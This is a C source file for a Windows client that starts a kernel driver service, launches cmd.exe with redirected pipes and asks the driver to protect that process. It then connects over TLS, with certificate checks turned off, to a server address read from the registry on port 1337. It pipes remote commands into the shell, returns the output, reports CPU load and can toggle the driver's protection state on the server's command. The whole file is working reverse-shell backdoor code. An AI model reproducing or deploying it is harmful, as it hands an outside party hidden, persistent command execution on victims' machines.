#define CUTE_TLS_IMPLEMENTATION
#define TLS_DONT_CHECK_CERT
#include "cute_tls.h"

#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#include "../shared.h"

#define MAX_BUF (4096 + 3)

float getCpu() {
	FILETIME idleFt, kernelFt, userFt;
	ULARGE_INTEGER li1, li2;
	uint64_t idle, total, dIdle, dTotal;
	static uint64_t prevIdle = 0, prevTotal = 0;
	float currCpu;

	GetSystemTimes(&idleFt, &kernelFt, &userFt);

	li1.LowPart = idleFt.dwLowDateTime;
	li1.HighPart = idleFt.dwHighDateTime;
	idle = li1.QuadPart;
	dIdle = idle - prevIdle;

	li1.LowPart = kernelFt.dwLowDateTime;
	li1.HighPart = kernelFt.dwHighDateTime;

	li2.LowPart = userFt.dwLowDateTime;
	li2.HighPart = userFt.dwHighDateTime;

	total = (li1.QuadPart + li2.QuadPart);
	dTotal = total - prevTotal;

	currCpu = 1.0f - ((dTotal > 0) ? (((float)dIdle) / dTotal) : 0);

	prevIdle = idle;
	prevTotal = total;

	return currCpu * 100.0f;
}

int main(int argc, char *argv[]) {
	FILE *fw;
	SC_HANDLE driverSvc;
	HANDLE driver, cmdPid, cmdStdinR, cmdStdinW, cmdStdoutR, cmdStdoutW;
	DWORD32 serverIp = 0, protectState;
	DWORD regSize = sizeof(DWORD32), readN;
	char serverHostname[16], cmdName[] = "cmd.exe";
	uint8_t *buf;
	TLS_Connection conn;
	TLS_State state;
	int n, pendingN;
	LARGE_INTEGER freq, prevCounter, currCounter;
	double timeElapsed;
	uint16_t cmdSize;
	SECURITY_ATTRIBUTES sa;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;

	fw = fopen("iwa.log", "w");

	if (RegGetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\iwaclient", "ipaddr", RRF_RT_DWORD, NULL, &serverIp, &regSize)) {
		fprintf(fw, "RegGetValue");
		fclose(fw);
		return 1;
	}

	fprintf(fw, "Server IP %x\n", serverIp);
	driverSvc = OpenService(OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS), "iwa", SERVICE_START);
	if (!StartService(driverSvc, 0, NULL)) {
		fprintf(fw, "StartService %u\n", GetLastError());
		/*
		fclose(fw);
		return 1;
		*/
	}
	CloseServiceHandle(driverSvc);


	if ((driver = CreateFile("\\\\.\\iwa", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		fprintf(fw, "CreateFile %u\n", GetLastError());
#define DEBUG_NO_DRIVER 1
#ifndef DEBUG_NO_DRIVER
		fclose(fw);
		return 1;
#endif
	}

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&cmdStdoutR, &cmdStdoutW, &sa, 0)) {
		fprintf(fw, "CreatePipe %u\n", GetLastError());
		fclose(fw);
		return 1;
	}

	if (!SetHandleInformation(cmdStdoutR, HANDLE_FLAG_INHERIT, 0)) {
		fprintf(fw, "SetHandleInformation %u\n", GetLastError());
		fclose(fw);
		return 1;
	}

	if (!CreatePipe(&cmdStdinR, &cmdStdinW, &sa, 0)) {
		fprintf(fw, "CreatePipe %u\n", GetLastError());
		fclose(fw);
		return 1;
	}

	if (!SetHandleInformation(cmdStdinW, HANDLE_FLAG_INHERIT, 0)) {
		fprintf(fw, "SetHandleInformation %u\n", GetLastError());
		fclose(fw);
		return 1;
	}

	memset(&pi, 0, sizeof(PROCESS_INFORMATION));
	memset(&si, 0, sizeof(STARTUPINFO));

	si.cb = sizeof(STARTUPINFO);
	si.hStdError = cmdStdoutW;
	si.hStdOutput = cmdStdoutW;
	si.hStdInput = cmdStdinR;
	si.dwFlags |= STARTF_USESTDHANDLES;

	if (!CreateProcess(NULL, cmdName, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		fprintf(fw, "CreateProcess %u\n", GetLastError());
		fclose(fw);
		return 1;
	}

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	cmdPid = (HANDLE)pi.dwProcessId;
	if (!DeviceIoControl(driver, IOCTL_PROTECT_PID, &cmdPid, sizeof(HANDLE), NULL, 0, NULL, NULL)) {
		fprintf(fw, "DeviceIoControl %u\n", GetLastError());
#ifndef DEBUG_NO_DRIVER
		fclose(fw);
		return 1;
#endif
	}

	snprintf(serverHostname, sizeof(serverHostname), "%u.%u.%u.%u", serverIp >> 24, (serverIp >> 16) & 0xFF, (serverIp >> 8) & 0xFF, serverIp & 0xFF);
	fprintf(fw, "%s\n", serverHostname);

	buf = malloc(MAX_BUF);

	QueryPerformanceFrequency(&freq);
	QueryPerformanceCounter(&prevCounter);
	timeElapsed = 0.0;

	for (;;) {
		fprintf(fw, "up top\n");
		fflush(fw);
		conn = tls_connect(serverHostname, 1337);
		if (!conn.id) {
			fprintf(fw, "no conn id\n");
			Sleep(10000);
			continue;
		}

		for (pendingN = 0;;) {
			state = tls_process(conn);
			if (state == TLS_STATE_CONNECTED) {
				fprintf(fw, "success conn\n");
				fflush(fw);
				break;
			} else if (state == TLS_STATE_PENDING) {
				if (pendingN++ >= 2000000) {
					Sleep(10000);
					fprintf(fw, "pended out\n");
					goto disconnect;
				}
			} else if (state < 0) {
				fprintf(fw, "tls_process %s\n", tls_state_string(state));
				goto disconnect;
			}
		}

		for (;;) {
			if (tls_process(conn) == TLS_STATE_DISCONNECTED) {
				break;
			}

			n = tls_read(conn, buf, 1);
			if (n < 0) goto disconnect;
			if (n) {
				switch (buf[0]) {
					case 0:
						n = tls_read(conn, buf, 2);
						if (n < 0) goto disconnect;
						if (n == 2) {
							cmdSize = ntohs(*((uint16_t*)buf));
							n = tls_read(conn, buf, cmdSize);
							if (n < 0) goto disconnect;
							if (n == cmdSize) {
								WriteFile(cmdStdinW, buf, cmdSize, NULL, NULL);
							}
						}
						break;
					case 2:
						n = tls_read(conn, buf, 1);
						if (n < 0) goto disconnect;
						if (n) {
							protectState = buf[0];
							DeviceIoControl(driver, IOCTL_SET_PROTECT_STATE, &protectState, sizeof(DWORD32), NULL, 0, NULL, NULL);
						}
						break;
				}
			}

			if (PeekNamedPipe(cmdStdoutR, NULL, 0, NULL, &readN, NULL)) {
				if (readN) {
					ReadFile(cmdStdoutR, buf + 3, MAX_BUF - 3, &readN, NULL);
					if (readN) {
						buf[0] = 0;
						*((uint16_t*)&buf[1]) = htons(readN);
						if (tls_send(conn, buf, readN + 3) < 0) goto disconnect;
					}
				}
			}

			QueryPerformanceCounter(&currCounter);
			timeElapsed += ((double)(((currCounter.QuadPart - prevCounter.QuadPart) * 1000000) / freq.QuadPart)) / 1000.0;
			prevCounter.QuadPart = currCounter.QuadPart;
			if (timeElapsed >= 250.0) {
				timeElapsed = 0.0;
				buf[0] = 1;
				*((uint32_t*)&buf[1]) = htonf(getCpu());
				if (tls_send(conn, buf, 5) < 0) goto disconnect;
			}
		}

disconnect:
		tls_disconnect(conn);
	}

	CloseHandle(driver);

	fclose(fw);

	return 0;
}